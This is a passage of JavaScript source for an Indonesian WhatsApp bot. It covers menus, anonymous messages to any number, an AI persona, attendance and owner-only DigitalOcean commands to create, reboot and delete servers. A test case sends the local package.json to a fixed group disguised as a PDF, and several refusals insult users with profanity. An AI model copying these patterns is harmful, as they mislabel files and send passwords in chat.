                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "absenmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.absenmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "pushkontakmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.pushkontakmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "aimenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.aimenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
       case "groupmenu": {
                
                zuu.sendMessage(m.chat, {
                    text: global.groupmenu,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.ids,
                            serverMessageId: null,
                            newsletterName: global.nems
                        },
                        externalAdReply: {
                            title: global.title,
                            body: timeday,
                            thumbnailUrl: thumurl,
                            sourceUrl: global.sourceurl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {})
            }
            break
           //=============[ Males nempatin cmd ]=================//
           case "doctes": 
           console.log(m.chat)
    zuu.sendMessage("120363372991117133@g.us", {
    document: fs.readFileSync("./package.json"),
    fileName: "document.pdf",
    mimetype: "application/pdf",
    caption: "nyoba kirim dokumen ke grup"
});
break
case "polltes":
zuu.sendPoll(m.chat, m.sender, ["s","love"])
break
case "love":
m.reply("our love ♡ "+waiter+" its Fucking "+m.chat+" "+m.sender)
break
case 'confess': case 'confes': case 'menfes': case 'menfess':{
roof = Object.values(zuu.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
zuu.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await zuu.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan.')
}
break
case 'balasmenfess': case 'balasmenfes': case 'accmenfess':{
let roof = Object.values(zuu.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(zuu.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
zuu.menfes[room.id] = {...room};
await zuu.sendMessage(other, { 
  text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, 
  mentions: [m.sender]
});
zuu.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': case 'rejecmenfess':{
roof = Object.values(zuu.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(zuu.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(zuu.menfes).find(menps => menpes.state == 'WAITING')
zuu.sendMessage(other, {text: `*[ @${m.sender.split("@")[0]} ] Menolak menfess kamu*`, mentions: [m.sender]})
reply("Menfess berhasil di tolak")
delete zuu.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': {
find = Object.values(zuu.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
zuu.sendMessage(to, {text: `_Partner telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply(mess.done)
delete zuu.menfes[find.id]
}
 break
 
case "rosie": {
                if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
                let prompt = `Namamu adalah Rossie, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

  Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

  Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!**  

  Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;
                
                let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
                let pftt = response.data;
                if (pftt.status === true) {
                    let resultText = pftt.data;
                    let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
                    let regexOwner = /\b(owner|pemilik|pencipta)\b/i;
                    
                    if (regexOwner.test(text)) {
                        resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! ZuunotFound adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!";
    }
                    
                    if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
                        let apiUrl = `https://xa-web.vercel.app/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
                        let { data } = await axios.get(apiUrl);
                        let buffer = Buffer.from(data.data.data);
                        await zuu.sendMessage(m.chat, { 
                            audio: buffer, 
                            mimetype: 'audio/mpeg', 
                            ptt: true 
                        }, { quoted: m });
                    } else {
                        reply(resultText);
                    }
                }
            }
            break
 
case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return
        if (!text) return reply(`mau tanyakan apa saja? contoh ${prefix + command} siapakah presiden Indonesia sekarang?`)
          let cuki = await fetchJson(`https://loco.web.id/wp-content/uploads/api/v1/bingai.php?q=${text}`)
          await reaction(m.chat, "🤭")
          let mamad = cuki.result.ai_response
          zuu.sendMessage(m.chat, { text : mamad }, {quoted:m})
      }
      break

case 'chatfes': {

}
break           
case 'mulaiabsen': {
if (!isGroup) return reply(mess.group)
    if (absenData[m.chat]) return reply('Absen sudah dimulai di obrolan ini!');
  
    absenData[m.chat] = {
        admin: userId, 
        participants: [], 
    };

    reply('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
break

case 'absen': {
if (!isGroup) return reply(mess.group)
    if (!absenData[m.chat]) return reply('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
    var vsbhsbbeheheh = zuu.getName(m.sender)
    absenData[m.chat].participants.push(vsbhsbbeheheh);
    reply('Anda telah berhasil bergabung dalam proses absen!');
}
break

case 'cekabsen': {
if (!isGroup) return reply(mess.group)
    if (!absenData[m.chat]) return reply('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');        
    const participants = absenData[m.chat].participants;    
    reply(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break

case 'hapusabsen': {
if (!isGroup) return reply(mess.group)
    if (absenData[m.chat] && absenData[m.chat].admin === m.sender) { 
        delete absenData[m.chat];        
        reply('Proses absen telah dihapus!');
    } else {
        reply('Anda tidak memiliki izin untuk menghapus proses absen!');
    }
}
break    
        
           case 'autotyping':
              if (!isCreator) return reply(mess.owner)
              if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    settingdb.autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    settingdb.autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    settingdb.autoRecording = true
                    reply(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    settingdb.autoRecording = false
                    reply(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtype':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    settingdb.autorecordtype = true
                    reply(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    settingdb.autorecordtype = false
                    reply(`Successfully changed auto recording and typing to ${q}`)
                }
                break
            case 'autobio':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    settingdb.autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    settingdb.autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
             break                
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return reply(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            zuu.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case "1221":
            zuu.sendMessage(m.chat, {audio: fs.readFileSync("./assets/1"), mimetype: 'audio/mpeg'}, { quoted : m })
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            zuu.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'editinfo':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[0] === 'open') {
                    await zuu.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Group Edit Info️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'close') {
                    await zuu.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Group Edit Info`)).catch((err) => reply(json(err)))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            //=============[ DO ]=================//
case "sisadroplet":{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 zuu.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      zuu.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      zuu.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      zuu.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

